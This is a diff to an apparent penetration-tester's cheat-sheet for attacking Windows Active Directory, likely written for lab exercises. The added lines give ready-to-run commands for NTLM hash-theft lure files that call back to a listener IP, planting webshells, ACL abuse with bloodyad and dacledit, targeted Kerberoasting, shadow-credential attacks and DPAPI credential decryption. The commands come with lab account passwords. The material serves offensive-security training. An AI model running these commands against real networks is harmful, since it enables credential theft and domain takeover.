@@ -31,21 +31,7 @@ toc: true
 - **Check the var/www directory for internal websites .**
 - **After Root :**
 - **Check the shadow file and root folder for important files , maybe some creds , crack the shadow file , you will need the passwd + shadow = unshadow then John .**
-
-### Windows :
-
-- **Check for Quick wins , PS history , Config files .**
-- **Check downloaded Programs that are unsual .**
-- **Check Active Directory Section .**
-  
-### Domains :
-
-- **Always run nxc on all IPs to get the computer names , identify servers and DCs .**
-- **Always Check the Network interfaces on every machine that we get access to , we can do a ping Sweep (In Cross Forest)**
-- **Import the agent for Ligolo and route the trafic .**
-- **Make sure you modify the Host file to have DC as Domain Name as well (Only DC)**
-- **Check Kerberos related files , we can use klist to get the TGT to impersonate users (check Kerberos Section in Post Exploitation)**
-
+ 
 
 ## Enumeration :
 
@@ -780,6 +766,19 @@ if you get access , Look for usernames using netexec , --rid-brute , --users and
 - **On a Local machine if nothing gives any value check the programs installed for a Priv Esc vector . (On Program Files after C:\).**
 - **Check for Executables that you can reverse engineer maybe for some credentials .**
 
+### Multiple Domains :
+
+- **Always run nxc on all IPs to get the computer names , identify servers and DCs then add them to the hostfile.**
+- **Always Check the Network interfaces on every machine that we get access to to check for internal networks, do a ping Sweep from the compromised machine(Specially the DC in Cross Domain)**
+- **Import the agent for Ligolo and route the trafic .**
+- **Check Kerberos related files , we can use klist to get the TGT to impersonate users (check Kerberos Section in Post Exploitation)**
+
+### Additional Tips :
+
+- **If you compromise a Web admin always upload a webshell to get execute commands as the webserver (might have SE Impersonate)**
+- **Found Write Privileges on a Share , upload an INK file to steal Hashes (more details in share section)**
+- **If we find a WMI file , extract it locally and try getting the DPAPI encrypted Creds (More details in WMI/DPAPI section)**
+
 ### Without Credentials :
 
 #### Enumerating DNS :
@@ -995,7 +994,8 @@ recurse on
 prompt off
 mget *
 
-**Writable Shares :** 
+**Writable Shares :**
+
 If we can write into a share always upload a INK file and setup responder , we might be able to capture some Hashes .
 https://github.com/Greenwolf/ntlm_theft
 git clone https://github.com/Greenwolf/ntlm_theft.git
@@ -1006,7 +1006,7 @@ python3 ntlm_theft.py --generate modern --server tun0 --filename "Please_Clickit
 https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC
 
 ==> There is also a module in NXC for this :
-
+nxc smb $target -u 'clerk.john' -p 'clerkhill' -M slinky -o NAME=Final_test SERVER=10.200.62.83
 
 ```
 
@@ -1167,7 +1167,7 @@ PS C:\Users\lvetrova> $Credential = Import-Clixml -Path "lvetrova.xml"
 PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
 ```
 
-### Password Must Change :
+#### Password Must Change :
 
 ```powershell
 smbpasswd -r $IP -U sbradley
@@ -1675,6 +1675,7 @@ use post/multi/recon/local_exploit_suggester : Auto Priv Esc suggestion .
 ### Run As On Windows :
 
 ```bash
+
 # If we got RDP : 
 
  runas /user:fela cmd
@@ -1775,6 +1776,11 @@ python3 wmiexec2.py anomaly.hsm/anna_molly@$target -hashes ':be4bf3131851aee9a42
 
 ### ACL Abuse :
 
+#### Quick Tips :
+
+- **Genric Write Can allow us to move a user to an OU, in case we had Generic ALL over an OU**
+
+
 ```bash
 
 # Force Change Password :
@@ -1798,9 +1804,20 @@ bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' ad
 
 # WriteAccountRestrictions - Enable disabled account :
 bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' remove uac 'TARGET' -f ACCOUNTDISABLE
+bloodyad --host $target -d 'city.local' -u 'emma.hayes' -p '!Gemma4James!' remove uac 'sam.brooks' -f ACCOUNTDISABLE
 
 # GenericWrite - Targeted Kerberoasting (Add SPN) :
 bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' set object 'TARGET' --attr servicePrincipalName -v 'fake/spn'
+==> To automate it :
+git clone https://github.com/ShutdownRepo/targetedKerberoast
+python3 targetedKerberoast.py -v -d 'city.local' -u 'jon.peters' -p '1234heresjonny' 
+
+==> Shadow Credential Attack:
+certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -p Password -account VictimAccount .
+certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -account VictimAccount . : This will give us the Hash of the VictimAccount . 
+
+# Write DACL Over an entire OU : Grant ourselves Generic ALL :
+dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'emma.hayes' -target-dn 'OU=CITYOPS,DC=CITY,DC=LOCAL' 'city.local'/'emma.hayes':'!Gemma4James!'
 
 # ReadGMSAPassword :
 bloodyad --host DC.domain.local -d 'domain.local' -u 'YOURUSER' -p 'YOURPASS' get object 'ACCOUNT$' --attr msDS-ManagedPassword
@@ -1819,19 +1836,33 @@ it s game over .
 
 ```
 
+### WMI Profile :
+
 ```bash
-If we have Generic Write over a user , we can either do a Targeted Kerberoast ,
-or we can use an attack called Shadow Credentials , we can either use pywhisker , 
-or certipy for this attack . pywhisker will be shown in Blood Hound . 
+Found a WMI profile ? First we need to extract it locally , we can use wmiextract :
+wimextract clerk.john_ProfileBackup_0729.wim 1 --dest-dir=/home/kali/HackSmarter/City_CounCIL/clerk_profile
 
-# For certipy : 
-
-certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -p Password -account VictimAccount .
-
-certipy-ad shadow auto -u usernamewhohasGenericWrite@Domain -H :NTLMHash -account VictimAccount . : This will give us the Hash of the VictimAccount . 
- 
 ```
 
+### Credential Manager (DPAPI) :
+
+```bash
+==> Quick explanation :
+When you save something in Credential Manager, Windows doesn’t store it in plaintext , it encrypts it using DPAPI. The encrypted blob gets saved as a file in: AppData/Roaming/Microsoft/Credentials/
+
+But DPAPI encryption is tied to the user’s password This is the key weakness , DPAPI uses the user’s own password as part of the encryption. So if you know the user’s password, you can decrypt anything they encrypted.
+
+The Master Key is what comes in between you could say : DPAPI doesn’t directly use the password to encrypt , it uses a Master Key, which itself is encrypted with the user’s password. So the chain is: Password + SID → decrypt Master Key
+Master Key → decrypt the Credential blob
+
+1/ Decrypting the master keyt : The Master key located usually here : AppData/Roaming/Microsoft/Protect/SID :
+
+impacket-dpapi masterkey -file /AppData/Roaming/Microsoft/Protect/S-1-5-21-407732331-1521580060-1819249925-1103/de222e76-cb5d-418f-a1c2-7e4e9dfe29e1 -sid S-1-5-21-407732331-1521580060-1819249925-1103 -password clerkhill 
+
+2/ Decrypting the credential Blob using the decrypted master Key:
+impacket-dpapi credential -file /AppData/Roaming/Microsoft/Credentials/03128079C6E14F37F5AEBDD69E344291 -key 0xedfc873c4b843cb27b48cb55d829bc24c8d2be3fd50ce2aa7ba72b8da6ec65afd41412dfecd16f38a120cadf4089dabb9a1817874e37bbf0d6861117a39dfbbd
+
+```
 
 ### Mimikatz :
 
